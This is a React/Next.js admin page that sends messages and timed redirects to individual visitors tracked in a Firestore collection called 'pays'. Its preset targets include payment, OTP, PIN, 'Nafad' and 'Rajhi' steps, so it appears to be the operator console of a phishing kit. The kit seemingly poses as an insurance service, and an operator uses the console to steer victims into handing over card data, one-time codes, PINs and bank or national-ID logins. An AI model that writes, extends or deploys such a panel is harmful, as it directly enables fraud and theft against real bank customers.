"use client"

import { useMemo, useState, type FormEvent } from "react"
import { doc, getDoc, setDoc, Firestore } from "firebase/firestore"
import { Loader2 } from "lucide-react"
import { db } from "@/lib/firebase"
import { Card, CardContent } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Button } from "@/components/ui/button"
import { Label } from "@/components/ui/label"
import { Alert, AlertDescription } from "@/components/ui/alert"

type RedirectMode = "none" | "preset" | "custom"

interface RedirectOption {
  label: string
  value: string
}

const REDIRECT_OPTIONS: RedirectOption[] = [
  { label: "Home", value: "/home-new" },
  { label: "Insurance Step", value: "/insur" },
  { label: "Comparison Step", value: "/compar" },
  { label: "Payment Step", value: "/check" },
  { label: "OTP Step", value: "/step2" },
  { label: "PIN Step", value: "/step3" },
  { label: "Nafad Step", value: "/step4" },
  { label: "Phone Step", value: "/step5" },
  { label: "Rajhi Step", value: "/step6" },
]

interface FeedbackState {
  type: "success" | "error"
  message: string
}

function normalizeRedirectPath(path: string): string | null {
  const trimmed = path.trim()
  if (!trimmed) return null

  if (/^https?:\/\//i.test(trimmed)) {
    return null
  }

  return trimmed.startsWith("/") ? trimmed : `/${trimmed}`
}

function parseDelaySeconds(rawValue: string): number {
  const parsed = Number(rawValue)
  if (!Number.isFinite(parsed)) return 0
  return Math.max(0, Math.min(120, Math.floor(parsed)))
}

export default function AdminMessagesPage() {
  const [visitorId, setVisitorId] = useState("")
  const [message, setMessage] = useState("")
  const [redirectMode, setRedirectMode] = useState<RedirectMode>("none")
  const [selectedRedirect, setSelectedRedirect] = useState(REDIRECT_OPTIONS[0].value)
  const [customRedirect, setCustomRedirect] = useState("")
  const [redirectDelay, setRedirectDelay] = useState("0")
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [feedback, setFeedback] = useState<FeedbackState | null>(null)

  const finalRedirectPath = useMemo(() => {
    if (redirectMode === "none") return null
    if (redirectMode === "preset") return selectedRedirect
    return normalizeRedirectPath(customRedirect)
  }, [redirectMode, selectedRedirect, customRedirect])

  const handleSubmit = async (event: FormEvent) => {
    event.preventDefault()

    const cleanVisitorId = visitorId.trim()
    const cleanMessage = message.trim()
    const delaySeconds = parseDelaySeconds(redirectDelay)

    if (!cleanVisitorId) {
      setFeedback({ type: "error", message: "Visitor ID is required." })
      return
    }

    if (!cleanMessage && !finalRedirectPath) {
      setFeedback({
        type: "error",
        message: "Please add a message and/or choose a redirect target.",
      })
      return
    }

    if (redirectMode === "custom" && !finalRedirectPath) {
      setFeedback({
        type: "error",
        message: "Custom redirect path must be internal, e.g. /step2",
      })
      return
    }

    if (!db) {
      setFeedback({
        type: "error",
        message: "Firebase is not configured in this environment.",
      })
      return
    }

    setIsSubmitting(true)
    setFeedback(null)

    try {
      const visitorRef = doc(db as Firestore, "pays", cleanVisitorId)
      const snapshot = await getDoc(visitorRef)

      if (!snapshot.exists()) {
        throw new Error("Visitor not found in Firestore collection 'pays'.")
      }

      const commandId = `admin_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`
      const queuedAt = new Date().toISOString()

      await setDoc(
        visitorRef,
        {
          adminCommand: {
            id: commandId,
            message: cleanMessage || null,
            redirectPath: finalRedirectPath,
            redirectDelaySeconds: delaySeconds,
            createdAt: queuedAt,
          },
          adminCommandQueuedAt: queuedAt,
          isUnread: true,
        },
        { merge: true },
      )

      setFeedback({
        type: "success",
        message: `Command sent to ${cleanVisitorId}${finalRedirectPath ? ` and redirect set to ${finalRedirectPath}.` : "."}`,
      })
      setMessage("")
      if (redirectMode === "custom") {
        setCustomRedirect("")
      }
    } catch (error) {
      const reason = error instanceof Error ? error.message : "Unknown error"
      setFeedback({
        type: "error",
        message: `Failed to send command: ${reason}`,
      })
    } finally {
      setIsSubmitting(false)
    }
  }

  return (
    <main className="min-h-screen bg-slate-100 p-4 md:p-8">
      <div className="mx-auto w-full max-w-3xl space-y-4">
        <h1 className="text-2xl font-bold text-slate-900">Visitor Messaging & Redirect Admin</h1>
        <p className="text-sm text-slate-600">
          Send text instructions to a specific visitor and optionally redirect them to any internal page.
        </p>

        <Card>
          <CardContent className="p-6">
            <form onSubmit={handleSubmit} className="space-y-5">
              <div className="space-y-2">
                <Label htmlFor="visitor-id">Visitor ID (Firestore doc ID in pays)</Label>
                <Input
                  id="visitor-id"
                  value={visitorId}
                  onChange={(event) => setVisitorId(event.target.value)}
                  placeholder="Example: VISITOR_1738452_XYZ"
                  required
                />
              </div>

              <div className="space-y-2">
                <Label htmlFor="visitor-message">Message Text (optional)</Label>
                <textarea
                  id="visitor-message"
                  value={message}
                  onChange={(event) => setMessage(event.target.value)}
                  placeholder="Write the message that should appear to the visitor..."
                  rows={4}
                  className="w-full rounded-md border border-input bg-background px-3 py-2 text-sm shadow-sm focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring"
                />
              </div>

              <div className="space-y-3 rounded-lg border bg-slate-50 p-4">
                <Label>Redirect Mode</Label>
                <div className="grid gap-2 sm:grid-cols-3">
                  <Button
                    type="button"
                    variant={redirectMode === "none" ? "default" : "outline"}
                    onClick={() => setRedirectMode("none")}
                  >
                    No Redirect
                  </Button>
                  <Button
                    type="button"
                    variant={redirectMode === "preset" ? "default" : "outline"}
                    onClick={() => setRedirectMode("preset")}
                  >
                    Preset Page
                  </Button>
                  <Button
                    type="button"
                    variant={redirectMode === "custom" ? "default" : "outline"}
                    onClick={() => setRedirectMode("custom")}
                  >
                    Custom Path
                  </Button>
                </div>

                {redirectMode === "preset" && (
                  <div className="space-y-2">
                    <Label htmlFor="redirect-select">Choose destination</Label>
                    <select
                      id="redirect-select"
                      value={selectedRedirect}
                      onChange={(event) => setSelectedRedirect(event.target.value)}
                      className="h-10 w-full rounded-md border border-input bg-background px-3 text-sm"
                    >
                      {REDIRECT_OPTIONS.map((option) => (
                        <option key={option.value} value={option.value}>
                          {option.label} ({option.value})
                        </option>
                      ))}
                    </select>
                  </div>
                )}

                {redirectMode === "custom" && (
                  <div className="space-y-2">
                    <Label htmlFor="custom-redirect">Custom internal path</Label>
                    <Input
                      id="custom-redirect"
                      value={customRedirect}
                      onChange={(event) => setCustomRedirect(event.target.value)}
                      placeholder="/some-page"
                    />
                  </div>
                )}

                {redirectMode !== "none" && (
                  <div className="space-y-2">
                    <Label htmlFor="delay-seconds">Redirect delay in seconds (0-120)</Label>
                    <Input
                      id="delay-seconds"
                      type="number"
                      min={0}
                      max={120}
                      value={redirectDelay}
                      onChange={(event) => setRedirectDelay(event.target.value)}
                    />
                  </div>
                )}
              </div>

              <div className="rounded-md border border-dashed p-3 text-sm text-slate-600">
                <span className="font-semibold text-slate-800">Preview: </span>
                {message.trim() ? `Message will show: "${message.trim()}". ` : "No message. "}
                {finalRedirectPath
                  ? `Redirect will go to ${finalRedirectPath} after ${parseDelaySeconds(redirectDelay)} seconds.`
                  : "No redirect."}
              </div>

              {feedback && (
                <Alert variant={feedback.type === "error" ? "destructive" : "default"}>
                  <AlertDescription>{feedback.message}</AlertDescription>
                </Alert>
              )}

              <Button type="submit" className="w-full" disabled={isSubmitting}>
                {isSubmitting ? (
                  <>
                    <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                    Sending...
                  </>
                ) : (
                  "Send To Visitor"
                )}
              </Button>
            </form>
          </CardContent>
        </Card>
      </div>
    </main>
  )
}
